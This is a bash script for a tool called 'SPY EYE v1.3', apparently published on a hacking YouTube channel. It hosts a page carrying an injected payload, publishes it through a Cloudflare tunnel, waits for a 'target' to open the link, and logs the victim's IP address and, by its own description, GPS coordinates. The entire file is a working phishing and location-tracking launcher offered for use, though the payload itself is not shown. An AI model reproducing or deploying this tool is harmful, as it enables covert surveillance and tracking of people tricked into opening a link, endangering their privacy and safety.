#!/bin/bash
# SPY EYE v 1.3
# Powered by ATHEX
# visit https://youtube.com/inziXploit444

# Animation variables
ANIMATION_SPEED=0.05
GREEN="\e[1;92m"
DARK_GREEN="\e[1;32m"
LIGHT_GREEN="\e[1;96m"
CYAN="\e[1;36m"
RESET="\e[0m"
BOLD="\e[1m"

trap 'printf "\n";stop' 2

# Animation functions
typewriter() {
    text=$1
    for ((i=0; i<${#text}; i++)); do
        printf "${GREEN}%s${RESET}" "${text:$i:1}"
        sleep $ANIMATION_SPEED
    done
    printf "\n"
}

loading_animation() {
    echo -ne "${GREEN}["
    for i in {1..20}; do
        echo -ne "▓"
        sleep 0.1
    done
    echo -ne "]${RESET}\r"
    echo -ne "                    \r"
}

pulse_text() {
    text=$1
    echo -ne "${LIGHT_GREEN}${text}${RESET}"
    sleep 0.3
    echo -ne "\r${GREEN}${text}${RESET}"
    sleep 0.3
    echo -ne "\r${DARK_GREEN}${text}${RESET}"
    sleep 0.3
    echo -ne "\r${GREEN}${text}${RESET}\n"
}

spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [${GREEN}%c${RESET}]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

print_green_box() {
    width=$1
    text=$2
    echo -e "${GREEN}┌"
    for ((i=0; i<width; i++)); do echo -n "─"; done
    echo -e "┐${RESET}"
    echo -e "${GREEN}│${RESET}${CYAN}${text}${RESET}${GREEN}│${RESET}"
    echo -e "${GREEN}└"
    for ((i=0; i<width; i++)); do echo -n "─"; done
    echo -e "┘${RESET}"
}

banner() {
    clear
    echo -e "${GREEN}"
    echo -e "╔═══════════════════════════════════════════════════════════╗"
    echo -e "║                                                           ║"
    echo -e "║  ███████╗██████╗ ██╗   ██╗     ███████╗ ██╗   ██╗███████╗║"
    echo -e "║  ██╔════╝██╔══██╗╚██╗ ██╔╝     ██╔════╝ ╚██╗ ██╔╝██╔════╝║"
    echo -e "║  ███████╗██████╔╝ ╚████╔╝      █████╗    ╚████╔╝ █████╗  ║"
    echo -e "║  ╚════██║██╔═══╝   ╚██╔╝       ██╔══╝     ╚██╔╝  ██╔══╝  ║"
    echo -e "║  ███████║██║        ██║        ███████╗    ██║   ███████╗║"
    echo -e "║  ╚══════╝╚═╝        ╚═╝        ╚══════╝    ╚═╝   ╚══════╝║"
    echo -e "║                                                           ║"
    echo -e "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "${DARK_GREEN}╭─────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${LIGHT_GREEN}│           Spy Eye v1.3 - Advanced Recon Tool           │${RESET}"
    echo -e "${DARK_GREEN}╰─────────────────────────────────────────────────────────╯${RESET}"
    echo -e ""
    
    # Animated tagline
    echo -ne "${CYAN}"
    echo -e "    ═══════════════════════════════════════════════════"
    echo -ne "${RESET}"
    
    sleep 0.5
    pulse_text "      Created by ATHEX [YT - inziXploit444]"
    
    echo -ne "${CYAN}"
    echo -e "    ═══════════════════════════════════════════════════"
    echo -ne "${RESET}"
    
    echo -e ""
    typewriter "SPY EYE is a sophisticated tool for information gathering"
    typewriter "and GPS coordinate capture with advanced tracking capabilities."
    echo -e ""
}

dependencies() {
    echo -e "${GREEN}[${CYAN}*${GREEN}]${RESET} Checking system dependencies..."
    sleep 0.5
    
    command -v php > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[${LIGHT_GREEN}✓${GREEN}]${RESET} PHP is installed"
    else
        echo -e "${GREEN}[${CYAN}!${GREEN}]${RESET} Installing PHP..."
        spinner $$ &
        apt-get install php -y > /dev/null 2>&1
        kill $!
        echo -e "\r${GREEN}[${LIGHT_GREEN}✓${GREEN}]${RESET} PHP installed successfully"
    fi
    sleep 0.3
}

stop() {
    echo -e "\n${GREEN}[${CYAN}!${GREEN}]${RESET} Cleaning up processes..."
    
    checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    
    if [[ $checkcf == *'cloudflared'* ]]; then
        echo -e "${GREEN}[${CYAN}-${GREEN}]${RESET} Stopping Cloudflared..."
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
    
    if [[ $checkphp == *'php'* ]]; then
        echo -e "${GREEN}[${CYAN}-${GREEN}]${RESET} Stopping PHP server..."
        killall -2 php > /dev/null 2>&1
    fi
    
    if [[ $checkssh == *'ssh'* ]]; then
        echo -e "${GREEN}[${CYAN}-${GREEN}]${RESET} Stopping SSH tunnels..."
        killall -2 ssh > /dev/null 2>&1
    fi
    
    echo -e "${GREEN}[${LIGHT_GREEN}✓${GREEN}]${RESET} Cleanup complete"
    exit 1
}

catch_ip() {
    echo -e "${GREEN}[${LIGHT_GREEN}⚡${GREEN}]${RESET} Target detected!"
    echo -e "${DARK_GREEN}┌─────────────────────────────────────────────────────────┐${RESET}"
    
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    
    # Animated IP display
    echo -ne "${GREEN}│${RESET} ${CYAN}IP Address:${RESET} "
    typewriter "$ip"
    echo -e "${DARK_GREEN}└─────────────────────────────────────────────────────────┘${RESET}"
    
    cat ip.txt >> saved.ip.txt
    echo -e "${GREEN}[${CYAN}📁${GREEN}]${RESET} IP saved to saved.ip.txt"
}

checkfound() {
    echo -e "\n${GREEN}[${CYAN}🕵️${GREEN}]${RESET} Waiting for targets..."
    echo -e "${DARK_GREEN}╭─────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${CYAN}│ Press ${LIGHT_GREEN}Ctrl + C${CYAN} to exit monitoring mode               │${RESET}"
    echo -e "${DARK_GREEN}╰─────────────────────────────────────────────────────────╯${RESET}"
    
    # Animated waiting indicator
    while [ true ]; do
        echo -ne "${GREEN}[${CYAN}👁${GREEN}]${RESET} Monitoring ${LIGHT_GREEN}.${RESET}\r"
        sleep 0.5
        echo -ne "${GREEN}[${CYAN}👁${GREEN}]${RESET} Monitoring ${LIGHT_GREEN}..${RESET}\r"
        sleep 0.5
        echo -ne "${GREEN}[${CYAN}👁${GREEN}]${RESET} Monitoring ${LIGHT_GREEN}...${RESET}\r"
        sleep 0.5
        echo -ne "${GREEN}[${CYAN}👁${GREEN}]${RESET} Monitoring ${LIGHT_GREEN}....${RESET}\r"
        sleep 0.5
        
        if [[ -e "ip.txt" ]]; then
            echo -e "\n${GREEN}[${LIGHT_GREEN}🎯${GREEN}]${RESET} Target opened the link!"
            catch_ip
            rm -rf ip.txt
            echo -e "${GREEN}[${CYAN}📊${GREEN}]${RESET} Displaying captured data:\n"
            tail -f -n 110 data.txt
        fi
    done 
}

cf_server() {
    echo -e "${GREEN}[${CYAN}⚙️${GREEN}]${RESET} Setting up Cloudflare tunnel..."
    
    if [[ -e cloudflared ]]; then
        echo -e "${GREEN}[${LIGHT_GREEN}✓${GREEN}]${RESET} Cloudflared already installed"
    else
        command -v wget > /dev/null 2>&1 || { 
            echo -e "${GREEN}[${CYAN}!${GREEN}]${RESET} Installing wget..."
            apt-get install wget -y > /dev/null 2>&1
        }
        
        echo -e "${GREEN}[${CYAN}⬇️${GREEN}]${RESET} Downloading Cloudflared..."
        arch=$(uname -m)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        
        spinner $$ &
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
        fi
        kill $!
        echo -e "\r${GREEN}[${LIGHT_GREEN}✓${GREEN}]${RESET} Cloudflared downloaded"
    fi
    
    chmod +x cloudflared
    echo -e "${GREEN}[${CYAN}🚀${GREEN}]${RESET} Starting PHP server..."
    
    spinner $$ &
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    kill $!
    sleep 2
    
    echo -e "${GREEN}[${CYAN}🌐${GREEN}]${RESET} Starting Cloudflare tunnel..."
    rm cf.log > /dev/null 2>&1 &
    
    spinner $$ &
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    kill $!
    sleep 10
    
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
    if [[ -z "$link" ]]; then
        echo -e "${GREEN}[${CYAN}⚠️${GREEN}]${RESET} Failed to generate direct link"
        exit 1
    else
        echo -e "${DARK_GREEN}┌─────────────────────────────────────────────────────────┐${RESET}"
        echo -e "${GREEN}│${RESET} ${CYAN}Direct Link:${RESET} ${LIGHT_GREEN}$link${RESET} ${GREEN}│${RESET}"
        echo -e "${DARK_GREEN}└─────────────────────────────────────────────────────────┘${RESET}"
    fi
    
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    checkfound
}

local_server() {
    sed 's+forwarding_link+''+g' template.php > index.php
    echo -e "${GREEN}[${CYAN}🏠${GREEN}]${RESET} Starting local server on 127.0.0.1:8080..."
    
    spinner $$ &
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    kill $!
    sleep 2
    
    echo -e "${DARK_GREEN}┌─────────────────────────────────────────────────────────┐${RESET}"
    echo -e "${GREEN}│${RESET} ${CYAN}Local Server:${RESET} ${LIGHT_GREEN}http://127.0.0.1:8080${RESET} ${GREEN}│${RESET}"
    echo -e "${DARK_GREEN}└─────────────────────────────────────────────────────────┘${RESET}"
    
    checkfound
}

SPYEYE() {
    echo -e "${GREEN}[${CYAN}🔄${GREEN}]${RESET} Initializing SPY EYE..."
    sleep 1
    
    if [[ -e data.txt ]]; then
        echo -e "${GREEN}[${CYAN}📄${GREEN}]${RESET} Archiving previous session data..."
        cat data.txt >> targetreport.txt
        rm -rf data.txt
        touch data.txt
    fi
    
    if [[ -e ip.txt ]]; then
        rm -rf ip.txt
    fi
    
    sed -e '/tc_payload/r payload' index_chat.html > index.html
    
    echo -e "${DARK_GREEN}╭─────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${CYAN}│             Select Server Configuration              │${RESET}"
    echo -e "${DARK_GREEN}╰─────────────────────────────────────────────────────────╯${RESET}"
    
    default_option_server="Y"
    echo -e "${GREEN}[${CYAN}?${GREEN}]${RESET} Use Cloudflare tunnel for public access?"
    echo -ne "${LIGHT_GREEN}›${RESET} [${GREEN}Y${RESET}] Cloudflare (Public) or [${CYAN}N${RESET}] Localhost: "
    read -p "" option_server
    option_server="${option_server:-${default_option_server}}"
    
    if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
        echo -e "${GREEN}[${CYAN}🌍${GREEN}]${RESET} Selected: Cloudflare Tunnel"
        cf_server
    else
        echo -e "${GREEN}[${CYAN}🏠${GREEN}]${RESET} Selected: Local Server"
        local_server
    fi
}

# Main execution
banner
dependencies
SPYEYE
